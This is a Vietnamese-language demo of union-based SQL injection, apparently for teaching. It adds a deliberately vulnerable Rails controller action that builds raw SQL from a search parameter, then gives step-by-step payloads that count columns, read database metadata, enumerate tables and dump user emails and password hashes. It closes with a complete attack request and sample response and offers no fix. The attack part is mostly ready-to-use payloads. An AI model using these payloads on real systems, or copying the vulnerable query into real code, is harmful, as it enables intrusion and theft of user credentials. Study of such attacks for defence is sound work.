# Union-based SQL Injection Demo

## Tạo controller vulnerable cho Union-based SQLi

```ruby
# app/controllers/events_controller.rb (thêm action vulnerable)
def search
  search_term = params[:search]
  
  # Query vulnerable cho Union-based SQLi
  sql = "SELECT id, title, description FROM events WHERE title LIKE '%#{search_term}%'"
  @events = Event.find_by_sql(sql)
  
  render json: { events: @events }
end
```

## Cách tấn công Union-based SQLi

### Bước 1: Xác định số cột trong query gốc
```sql
-- Test với 1 cột
search = ' UNION SELECT NULL--

-- Test với 2 cột  
search = ' UNION SELECT NULL,NULL--

-- Test với 3 cột (đúng số cột)
search = ' UNION SELECT NULL,NULL,NULL--
```

### Bước 2: Xác định kiểu dữ liệu của từng cột
```sql
-- Test cột 1 là integer
search = ' UNION SELECT 1,NULL,NULL--

-- Test cột 2 và 3 là string
search = ' UNION SELECT 1,'test','test'--
```

### Bước 3: Lấy thông tin hệ thống
```sql
-- Lấy version database
search = ' UNION SELECT 1,@@version,'database_version'--

-- Lấy tên database hiện tại
search = ' UNION SELECT 1,database(),'current_db'--

-- Lấy user hiện tại
search = ' UNION SELECT 1,user(),'current_user'--
```

### Bước 4: Lấy thông tin cấu trúc database
```sql
-- Lấy tên các bảng
search = ' UNION SELECT 1,table_name,'table_info' FROM information_schema.tables WHERE table_schema=database()--

-- Lấy tên các cột trong bảng users
search = ' UNION SELECT 1,column_name,'column_info' FROM information_schema.columns WHERE table_name='users'--
```

### Bước 5: Trích xuất dữ liệu từ các bảng
```sql
-- Lấy email và password từ bảng users
search = ' UNION SELECT 1,email,password_digest FROM users--

-- Lấy tất cả thông tin user
search = ' UNION SELECT id,email,role FROM users--

-- Lấy dữ liệu với điều kiện
search = ' UNION SELECT id,email,role FROM users WHERE role='admin'--
```

## Ví dụ Request hoàn chỉnh:

### Request để lấy thông tin admin:
```
GET /events/search?search=' UNION SELECT id,email,password_digest FROM users WHERE role='admin'--
```

### Response sẽ trả về:
```json
{
  "events": [
    {
      "id": 1,
      "title": "admin@example.com", 
      "description": "$2a$12$hashed_password_here"
    }
  ]
}
```

## Nguy hiểm của Union-based SQLi:
- Trích xuất toàn bộ dữ liệu từ database
- Lấy thông tin nhạy cảm (password, token, etc.)
- Khám phá cấu trúc database
- Có thể kết hợp với các kỹ thuật khác
